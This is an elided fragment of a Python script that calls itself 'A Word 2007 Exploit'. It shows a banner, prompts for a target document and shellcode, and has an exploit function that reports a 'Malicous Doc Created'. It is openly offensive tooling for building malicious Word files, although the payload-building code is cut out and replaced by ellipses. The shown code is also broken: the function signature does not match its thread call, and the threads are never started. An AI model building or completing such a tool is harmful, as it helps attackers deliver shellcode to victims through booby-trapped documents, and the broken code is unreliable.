...
banner = ('''
 ...
 |___/_||_\__,_|_|_|_\___|_|  \_,_|_| |___/\___/\__|
 						...
 						- It's all fun and games till you run it...
 						  - A Word 2007 Exploit
 ''')

print(Fore.RED + banner)

document = input(Fore.GREEN + "Target Document: ")
shellcode = input(Fore.GREEN + "Shellcode: ")
...
def exploit(self):
    ...
    f.close()
    time.sleep(2.1)
    print(Fore.RED + '\n[+] Malicous Doc Created\n')



if __name__ == "__main__": 

    thread1 = threading.Thread(target=bar, args=(10,)) 
    thread2 = threading.Thread(target=exploit, args=(10,)) 
